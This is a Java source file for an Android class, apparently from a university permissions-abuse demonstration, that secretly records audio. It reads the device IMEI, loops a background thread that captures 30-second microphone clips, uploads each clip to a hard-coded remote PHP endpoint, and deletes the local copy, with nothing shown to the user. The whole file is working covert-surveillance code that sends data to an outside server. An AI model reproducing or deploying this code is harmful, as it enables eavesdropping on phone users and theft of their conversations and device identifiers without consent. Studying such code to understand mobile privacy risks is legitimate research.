package edu.uiuc.permissionschecker;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import android.content.Context;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CreepyAudioRecorder {
	Context context;
	MediaRecorder recorder;
	Long scanseconds = 30L;
	String url = "http://mosyg2.cs.uiuc.edu/android/app/something2.php";
	String imei;
	public CreepyAudioRecorder(Context context) {
		this.context = context;
		TelephonyManager service = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		imei = service.getDeviceId();
	}
	
	
	
	public class RecordThread extends Thread {
		boolean keeprunning = true;
		public void run() {
			while(keeprunning)
				scanForSecondsAndUpload(scanseconds);
		}
	}
	
	RecordThread recordThread;

	
	
	public void startBackgroundRecording() {
		recordThread = new RecordThread();
		recordThread.start();
	}
	
	public void stopBackgroundRecording() {
		if (recordThread == null) return;
		recordThread.keeprunning = false;
		recordThread = null;
	}
	
	public boolean toggleBackgroundRecording() {
		if (recordThread == null || recordThread.keeprunning == false) {
			startBackgroundRecording();
			return true;
		} else {
			stopBackgroundRecording();
			return false;
		}
	}
	
	
	
	
	
	
	
	
	
	public void record(String path) throws IllegalStateException, IOException {
		recorder = new MediaRecorder();
	    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	    recorder.setOutputFile(path);
	    recorder.prepare();
	    recorder.start();
	}
	
	public void stop() throws IOException {
		recorder.stop();
		recorder.release();
	}

	
	
	
	
	
	public void scanForSecondsAndUpload(long seconds) {
		scanForSecondsAndUpload(seconds, false);
	}
	public void scanForSecondsAndUpload(long seconds, boolean waitOnUpload) {
		File file = new File(context.getFilesDir(), imei+"-"+System.currentTimeMillis()+".3gp");
		try {
			record(file.getAbsolutePath());
			Thread.sleep(seconds*1000L);
			stop();
			uploadFile(file, true, waitOnUpload);
		} catch (Exception e) {
			e.printStackTrace();
		} 
	}
	
	
	public void uploadFile(final File file,final boolean deleteonfinish, boolean waitOnUpload) {
		Log.d("UploadFile", "Uploading "+file);
		if (waitOnUpload) {
			uploadFile_internal(file);
			if (deleteonfinish) file.delete();
		} else {
			new Runnable() {
				public void run() {
					uploadFile_internal(file);
					if (deleteonfinish) file.delete();
				}
			}.run();
		}
	}
	
	
	
	
	
	
	
	public void uploadFile_internal(File NAME_OF_FILE) {

		try {
			FileInputStream fis = new FileInputStream(NAME_OF_FILE);
			HttpFileUploader htfu = new HttpFileUploader(url, "noparamshere", NAME_OF_FILE.getName());
			htfu.doStart(fis);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}

	
	
	
	
	
	
	
	
	
	
	
	
	
}
